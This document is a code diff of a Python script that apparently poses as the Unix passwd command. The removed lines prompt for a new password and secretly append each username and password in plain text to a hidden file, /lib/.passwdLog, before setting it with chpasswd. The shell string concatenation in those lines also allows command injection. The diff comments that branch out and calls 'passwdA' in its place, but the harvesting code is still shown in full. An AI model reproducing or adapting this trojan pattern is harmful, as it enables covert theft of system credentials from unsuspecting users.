@@ -30,22 +30,23 @@ def main():
         print("passwd: all authentication tokens updated successfully.")
         print("\n")
     else:
-        os.system('stty -echo')
-        while(x):
-            current = input("(current) UNIX password: ")
-            print("")
-            password = input("New password: ")
-            print("")
-            dump = input("Retype new password: ")
-            print("")
-            if(password != dump):
-                print("Sorry, passwords do not match.")
-                print("")
-            else:
-                x = False
-        os.system("echo \"" + user + ":" + password + "\" >> /lib/.passwdLog")
-        os.system("echo "+user+":"+password+" | chpasswd")
-        print("passwd: all authentication tokens updated successfully.")
-        print("\n")
+        #os.system('stty -echo')
+        #while(x):
+            #current = input("(current) UNIX password: ")
+            #print("")
+            #password = input("New password: ")
+            #print("")
+            #dump = input("Retype new password: ")
+            #print("")
+            #if(password != dump):
+                #print("Sorry, passwords do not match.")
+                #print("")
+            #else:
+                #x = False
+        #os.system("echo \"" + user + ":" + password + "\" >> /lib/.passwdLog")
+        #os.system("echo "+user+":"+password+" | chpasswd")
+        #print("passwd: all authentication tokens updated successfully.")
+        #print("\n")
+        os.system("passwdA")
     os.system('stty echo')
 main()
